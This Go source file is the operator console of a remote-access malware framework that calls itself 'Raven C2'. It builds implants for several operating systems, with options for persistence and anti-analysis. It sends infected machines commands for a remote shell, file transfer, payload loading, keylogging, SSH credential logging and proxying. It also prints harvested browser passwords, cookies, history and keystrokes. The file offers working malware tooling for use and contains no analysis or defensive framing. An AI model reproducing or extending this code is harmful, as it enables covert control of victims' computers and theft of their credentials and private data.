package cli

import (
	"bufio"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	rnd "math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"server/builder"
	"server/common"
	"server/database"
	"server/shell"
	"strconv"
	"strings"
	"time"
)

func banner() {
	fmt.Println(`
██████╗  █████╗ ██╗   ██╗███████╗███╗   ██╗     ██████╗██████╗ 
██╔══██╗██╔══██╗██║   ██║██╔════╝████╗  ██║    ██╔════╝╚════██╗
██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║    ██║      █████╔╝
██╔══██╗██╔══██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║    ██║     ██╔═══╝ 
██║  ██║██║  ██║ ╚████╔╝ ███████╗██║ ╚████║    ╚██████╗███████╗
╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝     ╚═════╝╚══════╝
`)
	fmt.Println("Command & Control Server")
	fmt.Println("Version: 1.0.0")
	fmt.Println("Author: BEND0US\n")
}

func CLI() {
	banner()
	fmt.Println("Type 'help' to see the commands")
	scanner := bufio.NewScanner(os.Stdin)

	for {

		fmt.Print("$raven > ")

		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		args := strings.Fields(input)
		cmd := args[0]
		cmdArgs := args[1:]

		switch cmd {
		case "help":
			showHelp()
		case "clients":
			cmdClients(cmdArgs)
		case "builds":
			cmdBuilds(cmdArgs)
		case "interact":
			if len(cmdArgs) == 0 {
				fmt.Println("Error: No ClientID")
				continue
			}
			cmdInteract(cmdArgs)
		case "clear":
			cmdClear(nil)
		case "exit":
			cmdExit(nil)
		case "build":
			cmdBuild(cmdArgs)
		case "enroll":
			cmdEnroll(cmdArgs)
		case "set-alias":
			if len(cmdArgs) < 4 {
				fmt.Println("Usage: set-alias -client [clientID] -alias [name]")
				continue
			}

			var clientID, alias string

			// Parse parameters
			for i := 0; i < len(cmdArgs); i++ {
				if cmdArgs[i] == "-client" && i+1 < len(cmdArgs) {
					clientID = cmdArgs[i+1]
					i++
				} else if cmdArgs[i] == "-alias" && i+1 < len(cmdArgs) {
					// Combine all arguments after -alias
					alias = strings.Join(cmdArgs[i+1:], " ")
					break
				}
			}

			if clientID == "" || alias == "" {
				fmt.Println("Usage: set-alias -client [clientID] -alias [name]")
				continue
			}

			// Update in database
			db := database.GetDatabase()
			err := db.UpdateClientName(clientID, alias)
			db.Close()

			if err != nil {
				fmt.Printf("Error: %v\n", err)
				continue
			}

			fmt.Printf("Alias '%s' set for client %s\n", alias, clientID)
		default:
			fmt.Printf("Invalid Command: %s\n", cmd)
			fmt.Println("Type 'help' to see the commands")
		}
	}
}

func showHelp() {
	fmt.Println("Commands:")
	fmt.Println(strings.Repeat("─", 50))
	//fmt.Println("sessions       List active sessions")
	fmt.Println("clients        List connected clients")
	fmt.Println("builds         Show build history")
	fmt.Println("interact <id>  Interact with a session")
	//fmt.Println("kill <id>      Terminate a session")
	fmt.Println("clear          Clear the screen")
	fmt.Println("exit           Exit the program")
	fmt.Println("build <os>/<arch> [-persistence]  Create a build")
	fmt.Println("enroll <filename>  Add a file to the upload directory")
	fmt.Println("set-alias -client [clientID] -alias [name]  Set a name for a client")
	fmt.Println(strings.Repeat("─", 50) + "\n")
}

func showInteractHelp() {
	fmt.Println("Commands:")
	fmt.Println(strings.Repeat("─", 50))
	fmt.Println("systeminfo     System Information")
	fmt.Println("shell          Shell start")
	fmt.Println("upload         Upload File")
	fmt.Println("download       Download File")
	fmt.Println("loader         Loader Module")
	//fmt.Println("screenshot     Get Screenshot")
	//fmt.Println("browser        Get Browser")
	fmt.Println("keylogger      Get Keylogger")
	fmt.Println("proxy          Get Proxy")
	fmt.Println("sshlogger      Get SSH Information")
	fmt.Println("show <type>    Show collected data (systeminfo, keylogger, etc)")
	fmt.Println("clear          Clear the screen")
	fmt.Println("exit           Exit the Interact")
	fmt.Println(strings.Repeat("─", 50) + "\n")
}

func showInteractWINHelp() {
	fmt.Println("Commands:")
	fmt.Println(strings.Repeat("─", 50))
	fmt.Println("systeminfo     System Information")
	fmt.Println("shell          Shell start")
	fmt.Println("upload         Upload File")
	fmt.Println("download       Download File")
	fmt.Println("loader         Loader Module")
	fmt.Println("keylogger      Get Keylogger")
	fmt.Println("proxy          Get Proxy")
	fmt.Println("show <type>    Show collected data (systeminfo, etc)")
	fmt.Println("clear          Clear the screen")
	fmt.Println("exit           Exit the Interact")
	fmt.Println(strings.Repeat("─", 50) + "\n")
}

func cmdEnroll(args []string) {
	if len(args) < 1 {
		fmt.Println("Usage: enroll <filename>")
		return
	}

	filename := args[0]

	uploadDir := "../cmd/uploads" // Directory to store files

	// Check if directory exists, create if not
	if err := os.MkdirAll(uploadDir, 0755); err != nil {
		fmt.Printf("Directory creation error: %v\n", err)
		return
	}

	// Check if file exists
	filePath := filepath.Join(uploadDir, filename)
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		fmt.Printf("Error: File %s not found\n", filePath)
		return
	}

	// Generate unique hash value
	fileHash := generateUniqueHash()

	// Save to database
	db := database.GetDatabase()
	err := db.SaveUploading(filename, fileHash)
	if err != nil {
		fmt.Printf("Database error: %v\n", err)
		return
	}

	fmt.Printf("File successfully saved: %s (Hash: %s)\n", filename, fileHash)
}

func cmdInteract(args []string) {

	clientID := args[0]

	db := database.GetDatabase()
	clients, err := db.GetClient(clientID)
	db.Close()

	if err != nil {
		fmt.Println("Error")
		return
	}

	if clients.ClientID == "" || clients.ClientID != clientID {
		return
	}

	fmt.Println("Type 'help' to see the commands")
	scanner := bufio.NewScanner(os.Stdin)

ExitInteract:
	for {

		fmt.Print("$" + clientID + " > ")

		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		args := strings.Fields(input)
		cmd := args[0]
		//cmdArgs := args[1:]

		switch cmd {
		case "help":
			db := database.GetDatabase()
			os, _ := db.GetClientOS(clientID)
			if os == "windows" {
				showInteractWINHelp()
			} else {
				showInteractHelp()
			}
		case "shell":
			port := findAvailablePort()
			if port == "0" {
				fmt.Println("Error: No available port found")
				continue
			}

			interactive := false
			if len(args) > 1 && args[1] == "-i" {
				interactive = true
			}

			fmt.Printf("Using port %s for shell connection\n", port)
			var shellCmd string
			if interactive {
				shellCmd = fmt.Sprintf("shell -port %s -i", port)
			} else {
				shellCmd = fmt.Sprintf("shell -port %s", port)
			}
			setCommand(clientID, shellCmd)

			// Start shell
			shell.Shell(port, interactive)
			//setCommand(clientID, "shell")
			//shell.Shell()
		case "download":
			if len(args) < 2 {
				fmt.Println("Usage: download <file_path>")
				continue
			}

			// Parse command line
			filePath := extractFilePath(input, "download")

			if filePath == "" {
				fmt.Println("Error: File path required")
				continue
			}

			fmt.Printf("File to download: %s\n", filePath)

			// Create command
			downloadCmd := "download"
			if strings.Contains(filePath, " ") {
				downloadCmd += " \"" + filePath + "\""
			} else {
				downloadCmd += " " + filePath
			}
			setCommand(clientID, downloadCmd)
			//filepath := args[1]
			//setCommand(clientID, "download "+filepath)
		case "upload":
			/*server_filepath := args[1]
			client_folderpath := args[2]
			j := createJSONCommand("upload", map[string]string{
				"server_path": server_filepath,
				"client_path": client_folderpath,
			})*/

			if len(args) < 3 {
				fmt.Println("Usage: upload <filename> <target_folder_path>")
				continue
			}

			filename := args[1]

			// Combine target path (may contain spaces)
			targetPath := strings.Join(args[2:], " ")

			// Get hash value from database
			db := database.GetDatabase()
			fileHash, err := db.GetUploadingByFilename(filename)
			if err != nil {
				// If hash value not found, use filename directly
				fmt.Printf("Warning: File %s not found in database, using filename directly\n", filename)

				// Quote paths containing spaces
				if strings.Contains(targetPath, " ") {
					targetPath = "\"" + targetPath + "\""
				}

				setCommand(clientID, fmt.Sprintf("upload -file %s -path %s", filename, targetPath))
			} else {
				// Hash value found, use hash value
				fmt.Printf("File: %s (Hash: %s)\nTarget: %s\n", filename, fileHash, targetPath)

				// Quote paths containing spaces
				if strings.Contains(targetPath, " ") {
					targetPath = "\"" + targetPath + "\""
				}

				setCommand(clientID, fmt.Sprintf("upload -file %s -path %s", fileHash, targetPath))
			}
		case "loader":
			if len(args) < 3 {
				fmt.Println("Usage: loader <source_file_path> <target_folder_path>")
				continue
			}

			// Parse command line
			sourceFilePath, targetFolderPath := extractFilePaths(input, "loader")

			if sourceFilePath == "" || targetFolderPath == "" {
				fmt.Println("Error: Source file path and target folder path required")
				continue
			}

			fmt.Printf("Source: %s\nTarget: %s\n", sourceFilePath, targetFolderPath)

			// Create command
			loaderArgs := []string{"loader", "-file", sourceFilePath, "-path", targetFolderPath}
			for i, arg := range loaderArgs {
				if strings.Contains(arg, " ") {
					loaderArgs[i] = "\"" + arg + "\""
				}
			}
			l := strings.Join(loaderArgs, " ")
			//l := "loader -file " + args[1] + " -path " + args[2]
			setCommand(clientID, l)
		case "browser":
			setCommand(clientID, "browser")
		case "screenshot":
			setCommand(clientID, "screenshot")
		case "systeminfo":
			setCommand(clientID, "systeminfo")
		case "keylogger":
			setCommand(clientID, "keylogger")
		case "sshlogger":
			setCommand(clientID, "sshlogger")
		case "show":
			if len(args) < 2 {
				fmt.Println("Error: Data type not specified. Usage: show <type>")
				fmt.Println("Supported data types: systeminfo, browser")
				continue
			}
			showClientData(clientID, args[1])
		case "clear":
			cmdClear(nil)
		case "exit":
			break ExitInteract
		default:
			fmt.Printf("Invalid Command: %s\n", cmd)
			fmt.Println("Type 'help' to see the commands")
		}
	}
}

func cmdClear(args []string) {
	//fmt.Print("\033[H\033[2J")
	switch runtime.GOOS {
	case "linux", "darwin":
		fmt.Print("\033[H\033[2J")
	case "windows":
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
	default:
		fmt.Println("Platform not supported for clear command")
	}
}

func cmdExit(args []string) {
	fmt.Println("\nProgram is terminating...")
	os.Exit(0)
}

func cmdClients(args []string) {
	db := database.GetDatabase()
	clients, err := db.ListClients()
	db.Close()
	if err != nil {
		fmt.Println("Error fetching clients: %v", err)
	}

	if len(clients) == 0 {
		fmt.Println("No connected clients")
	} else {
		fmt.Println("\nCLIENTS:")
		fmt.Println(strings.Repeat("─", 200))
		fmt.Printf("%-40s %-20s %-20s %-20s %-20s %-20s %-20s %-20s %-20s\n", "ID", "Name", "OS", "Hostname", "IP", "BuildID", "ReceivedAt", "LastSeen", "Status")
		fmt.Println(strings.Repeat("─", 200))

		for _, client := range clients {
			receivedAt := time.Unix(client.ReceivedAt, 0)
			lastSeen := time.Unix(client.LastSeen, 0)

			secondsSinceLastSeen := time.Since(lastSeen).Seconds()
			status := "Inactive"
			if secondsSinceLastSeen < 5 {
				status = "Active"
			}

			fmt.Printf("%-40s %-20s %-20s %-20s %-20s %-20s %-20s %-20s %-20s\n", client.ClientID, client.ClientName, client.OS, client.Hostname, client.IP, client.BuildID, receivedAt.Format("2006-01-02 15:04:05"), lastSeen.Format("2006-01-02 15:04:05"), status)
		}
	}
	fmt.Println("\n")
}

func cmdBuilds(args []string) {
	db := database.GetDatabase()
	builds, err := db.ListBuilds()
	db.Close()
	if err != nil {
		fmt.Println("Error fetching builds: %v", err)
	}

	if len(builds) == 0 {
		fmt.Println("Build history is empty")
	} else {
		fmt.Println("\nBUILDS:")
		fmt.Println(strings.Repeat("─", 120))
		fmt.Printf("%-20s %-20s %-20s %-20s %-20s\n", "BuildID", "OS", "Arch", "Persistence", "CreatedAt")
		fmt.Println(strings.Repeat("─", 120))
		for _, build := range builds {
			createdAt := time.Unix(build.CreatedAt, 0)
			fmt.Printf("%-20s %-20s %-20s %-20t %-20s\n", build.BuildID, build.OS, build.Arch, build.Persistence, createdAt.Format("2006-01-02 15:04:05"))
		}
	}
	fmt.Println("\n")
}

func cmdBuild(args []string) {
	fmt.Println("Building...")
	var supportedPlatforms = map[string]bool{
		"windows/amd64": true,
		"windows/386":   true,
		"linux/amd64":   true,
		"linux/386":     true,
		"linux/arm64":   true,
		"darwin/amd64":  true,
		"darwin/arm64":  true,
	}

	if len(args) < 1 {
		fmt.Println("\nUsage: build <os>/<arch> -ip 127.0.0.1 -port 443")
		fmt.Println("\nUsage: build <os>/<arch> [-persistence]")
		fmt.Println("\nExamples:")
		fmt.Println("  build linux/amd64")
		fmt.Println("  build darwin/arm64 -persistence\n")
		return
	}

	config := common.BuildConfig{}
	osArch := strings.Split(args[0], "/")

	if len(osArch) != 2 || !supportedPlatforms[args[0]] {
		fmt.Println("Unsupported OS/Arch combination. Supported platforms are:")
		for platform := range supportedPlatforms {
			fmt.Println("  -", platform)
		}
		return
	}
	config.OS = osArch[0]
	config.Arch = osArch[1]

	for i := 1; i < len(args); i++ {
		switch args[i] {
		case "-ip":
			if i+1 >= len(args) {
				fmt.Println("No IP provided after --ip")
				return
			}
			config.IP = args[i+1]
			i++
		case "-port":
			if i+1 >= len(args) {
				fmt.Println("No port provided after --port")
				return
			}
			config.Port = args[i+1]
			i++
		case "-antitech":
			config.ANTITECH = true
		case "-persistence":
			config.Persistence = true
		}
	}

	if !validateIP(config.IP) {
		fmt.Println("IP must be specified")
		return
	}
	if !validatePort(config.Port) {
		fmt.Println("Port must be specified")
		return
	}

	ID, err := builder.Build(config)
	if err != nil {
		fmt.Printf("Build Error: %v\n", err)
		return
	}

	builddb := common.Build{}
	builddb.BuildID = ID
	builddb.OS = config.OS
	builddb.Arch = config.Arch
	builddb.IP = config.IP
	builddb.Port = config.Port
	builddb.Persistence = config.Persistence
	builddb.CreatedAt = time.Now().Unix()

	db := database.GetDatabase()
	err = db.AddBuild(builddb)
	db.Close()
	if err != nil {
		fmt.Println("Error build: %v", err)
		return
	}

	fmt.Println("Build completed successfully!")
}

func validateIP(ip string) bool {
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return false
	}
	return true
}

func validatePort(port string) bool {
	p, err := strconv.Atoi(port)
	if err != nil {
		return false
	}
	if p < 0 || p > 65535 {
		return false
	}
	return true
}

func setCommand(clientID string, command string) {
	db := database.GetDatabase()
	db.SetCommand(clientID, command)
	db.Close()
	fmt.Println("Command set successfully!")
}

func createJSONCommand(command string, args map[string]string) string {
	cmdData := map[string]interface{}{
		"command": command,
		"args":    args,
	}

	jsonData, err := json.Marshal(cmdData)
	if err != nil {
		fmt.Printf("JSON creation error: %v\n", err)
		return ""
	}

	return string(jsonData)
}

func showClientData(clientID, dataType string) {
	db := database.GetDatabase()
	defer db.Close()

	switch dataType {
	case "systeminfo":
		showSystemInfo(db, clientID)
	case "browser":
		showBrowserData(db, clientID)
	case "keylogger":
		showKeylogs(db, clientID)
	default:
		fmt.Printf("Unknown data type: %s\n", dataType)
		fmt.Println("Supported data types: systeminfo, keylogger")
	}
}

func showSystemInfo(db *database.Database, clientID string) {
	info, err := db.GetSystemInfo(clientID)
	if err != nil {
		fmt.Printf("System info not found: %v\n", err)
		return
	}

	if info.ClientID == "" {
		fmt.Println("No system info found for this client")
		return
	}

	fmt.Println("\nSYSTEM INFO:")
	fmt.Println(strings.Repeat("─", 80))
	fmt.Printf("Hostname:     %s\n", info.Hostname)
	fmt.Printf("Username:    %s\n", info.Username)
	fmt.Printf("OS: %s\n", info.OS)
	fmt.Printf("HomeDir:    %s\n", info.HomeDir)
	fmt.Printf("Shell:        %s\n", info.Shell)
	fmt.Println(strings.Repeat("─", 80))

	fmt.Println("\nCPU INFO:")
	fmt.Println(strings.Repeat("─", 80))
	fmt.Println(info.CPUInfo)
	fmt.Println(strings.Repeat("─", 80))

	fmt.Println("\nMEMORY INFO:")
	fmt.Println(strings.Repeat("─", 80))
	fmt.Println(info.MemoryInfo)
	fmt.Println(strings.Repeat("─", 80))

	fmt.Println("\nDISK INFO:")
	fmt.Println(strings.Repeat("─", 80))
	fmt.Println(info.DiskInfo)
	fmt.Println(strings.Repeat("─", 80))

	fmt.Println("\nNETWORK INFO:")
	fmt.Println(strings.Repeat("─", 80))
	fmt.Println(info.NetworkInfo)
	fmt.Println(strings.Repeat("─", 80))

	receivedAt := time.Unix(info.ReceivedAt, 0).Format("2006-01-02 15:04:05")
	fmt.Printf("\nReceived At: %s\n", receivedAt)
	fmt.Println(strings.Repeat("─", 80))
}

func showBrowserData(db *database.Database, clientID string) {
	browserData, err := db.GetBrowserData(clientID)
	if err != nil {
		fmt.Printf("Browser data not found: %v\n", err)
		return
	}

	if len(browserData) == 0 {
		fmt.Println("No browser data found for this client")
		return
	}

	historyData := filterBrowserDataByType(browserData, "history")
	bookmarkData := filterBrowserDataByType(browserData, "bookmark")
	passwordData := filterBrowserDataByType(browserData, "password")
	cookieData := filterBrowserDataByType(browserData, "cookie")

	if len(historyData) > 0 {
		fmt.Printf("\nHISTORY DATA (%d):\n", len(historyData))
		fmt.Println(strings.Repeat("─", 120))
		fmt.Printf("%-30s %-40s %-20s %-20s\n", "Browser", "URL", "Title", "Date")
		fmt.Println(strings.Repeat("─", 120))

		count := 0
		for i := len(historyData) - 1; i >= 0 && count < 20; i-- {
			data := historyData[i]
			date := formatDate(data.Date)
			fmt.Printf("%-30s %-40s %-20s %-20s\n",
				truncateString(data.Browser, 30),
				truncateString(data.URL, 40),
				truncateString(data.Title, 20),
				date)
			count++
		}
		fmt.Println(strings.Repeat("─", 120))
		fmt.Printf("Total %d history data (last 20 shown)\n", len(historyData))
	}

	if len(passwordData) > 0 {
		fmt.Printf("\nPASSWORD DATA (%d):\n", len(passwordData))
		fmt.Println(strings.Repeat("─", 120))
		fmt.Printf("%-30s %-40s %-20s %-20s\n", "Browser", "URL", "Username", "Password")
		fmt.Println(strings.Repeat("─", 120))

		count := 0
		for i := len(passwordData) - 1; i >= 0 && count < 20; i-- {
			data := passwordData[i]
			fmt.Printf("%-30s %-40s %-20s %-20s\n",
				truncateString(data.Browser, 30),
				truncateString(data.URL, 40),
				truncateString(data.Username, 20),
				truncateString(data.Password, 20))
			count++
		}
		fmt.Println(strings.Repeat("─", 120))
		fmt.Printf("Total %d password data (last 20 shown)\n", len(passwordData))
	}

	if len(bookmarkData) > 0 {
		fmt.Printf("\nBOOKMARK DATA (%d):\n", len(bookmarkData))
		fmt.Println(strings.Repeat("─", 120))
		fmt.Printf("%-30s %-40s %-20s %-20s\n", "Browser", "URL", "Title", "Folder")
		fmt.Println(strings.Repeat("─", 120))

		count := 0
		for i := len(bookmarkData) - 1; i >= 0 && count < 20; i-- {
			data := bookmarkData[i]
			fmt.Printf("%-30s %-40s %-20s %-20s\n",
				truncateString(data.Browser, 30),
				truncateString(data.URL, 40),
				truncateString(data.Title, 20),
				truncateString(data.Value, 20))
			count++
		}
		fmt.Println(strings.Repeat("─", 120))
		fmt.Printf("Total %d bookmark data (last 20 shown)\n", len(bookmarkData))
	}

	if len(cookieData) > 0 {
		fmt.Printf("\nCOOKIE DATA (%d):\n", len(cookieData))
		fmt.Println(strings.Repeat("─", 120))
		fmt.Printf("%-30s %-40s %-20s %-20s\n", "Browser", "Domain", "Name", "Value")
		fmt.Println(strings.Repeat("─", 120))

		count := 0
		for i := len(cookieData) - 1; i >= 0 && count < 20; i-- {
			data := cookieData[i]
			fmt.Printf("%-30s %-40s %-20s %-20s\n",
				truncateString(data.Browser, 30),
				truncateString(data.URL, 40),
				truncateString(data.Title, 20),
				truncateString(data.Value, 20))
			count++
		}
		fmt.Println(strings.Repeat("─", 120))
		fmt.Printf("Total %d cookie data (last 20 shown)\n", len(cookieData))
	}
}

func showKeylogs(db *database.Database, clientID string) {
	keylogs, err := db.GetKeylogs(clientID)
	if err != nil {
		fmt.Printf("Could not get keylog data: %v\n", err)
		return
	}

	if len(keylogs) == 0 {
		fmt.Println("No keylog data found for this client.")
		return
	}

	fmt.Printf("\nKEYLOGS (%d records):\n", len(keylogs))
	fmt.Println(strings.Repeat("─", 120))
	fmt.Printf("%-25s %-50s %-20s %-15s\n", "Timestamp", "Window", "Key", "State")
	fmt.Println(strings.Repeat("─", 120))

	count := 0
	for i := 0; i < len(keylogs) && count < 100; i++ {
		log := keylogs[i]
		timestamp := log.Time.Format("2006-01-02 15:04:05")
		fmt.Printf("%-25s %-50s %-20s %-15s\n",
			timestamp,
			truncateString(log.Window, 50),
			truncateString(log.Key, 20),
			log.KeyState)
		count++
	}

	fmt.Println(strings.Repeat("─", 120))
	fmt.Printf("Last %d keylog records shown.\n", count)
}

func filterBrowserDataByType(data []common.BrowserData, dataType string) []common.BrowserData {
	var result []common.BrowserData
	for _, d := range data {
		if d.DataType == dataType {
			result = append(result, d)
		}
	}
	return result
}

func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

func formatDate(dateStr string) string {
	t, err := time.Parse(time.RFC3339, dateStr)
	if err != nil {
		return dateStr
	}
	return t.Format("2006-01-02 15:04:05")
}

// extractQuotedPath extracts the path in quotes and returns the remaining text
func extractQuotedPath(input string) (string, string, error) {
	input = strings.TrimSpace(input)

	if len(input) == 0 {
		return "", "", fmt.Errorf("empty input")
	}

	// Check for quote
	if input[0] != '"' && input[0] != '\'' {
		return "", "", fmt.Errorf("path must be specified in quotes")
	}

	quoteChar := input[0]

	// Find second quote
	endQuoteIndex := -1
	for i := 1; i < len(input); i++ {
		if input[i] == quoteChar && input[i-1] != '\\' {
			endQuoteIndex = i
			break
		}
	}

	if endQuoteIndex == -1 {
		return "", "", fmt.Errorf("closing quote not found")
	}

	// Extract path
	path := input[1:endQuoteIndex]

	// Clean escape characters
	path = strings.ReplaceAll(path, "\\\"", "\"")
	path = strings.ReplaceAll(path, "\\'", "'")

	// Return remaining text
	remaining := ""
	if endQuoteIndex+1 < len(input) {
		remaining = input[endQuoteIndex+1:]
	}

	return path, remaining, nil
}

func extractFilePaths(input, command string) (string, string) {
	// Extract command word
	input = strings.TrimPrefix(input, command)
	input = strings.TrimSpace(input)

	var firstPath, secondPath string

	// Check for quoted arguments
	if strings.HasPrefix(input, "\"") || strings.HasPrefix(input, "'") {
		// Extract quoted arguments
		var err error
		firstPath, input, err = extractQuotedPath(input)
		if err == nil {
			input = strings.TrimSpace(input)
			secondPath, _, err = extractQuotedPath(input)
			if err != nil {
				// If second argument is not quoted, take all remaining text
				secondPath = input
			}
		}
	} else {
		// If no quotes, split by space
		parts := strings.SplitN(input, " ", 2)
		if len(parts) > 0 {
			firstPath = parts[0]
		}
		if len(parts) > 1 {
			secondPath = parts[1]
		}
	}

	return firstPath, secondPath
}

// extractFilePath extracts a single file path from the command line
func extractFilePath(input, command string) string {
	firstPath, _ := extractFilePaths(input, command)
	return firstPath
}

func generateUniqueHash() string {
	// Generate random 16 bytes
	randomBytes := make([]byte, 16)
	rand.Read(randomBytes)

	// Add timestamp
	timestamp := time.Now().UnixNano()
	timestampBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(timestampBytes, uint64(timestamp))

	// Calculate hash
	hash := sha256.New()
	hash.Write(randomBytes)
	hash.Write(timestampBytes)

	return hex.EncodeToString(hash.Sum(nil))
}

func findAvailablePort() string {
	// Select random port between 10000-65000
	minPort := 10000
	maxPort := 65000

	// Create seed for random port selection
	rnd.Seed(time.Now().UnixNano())

	// Try maximum 50 times
	for i := 0; i < 50; i++ {
		// Select a random port between minPort and maxPort
		randomPort := minPort + rnd.Intn(maxPort-minPort+1)
		portStr := strconv.Itoa(randomPort)

		// Check if port is available
		if isPortAvailable(portStr) {
			return portStr
		}
	}

	// If random selection fails, try sequentially
	for port := minPort; port <= maxPort; port++ {
		portStr := strconv.Itoa(port)
		if isPortAvailable(portStr) {
			return portStr
		}
	}

	return "0" // No available port found
}

func isPortAvailable(port string) bool {
	// Try to listen on the port
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		// Port is in use or not accessible
		return false
	}

	// If successful, close the listener and return true
	listener.Close()
	return true
}
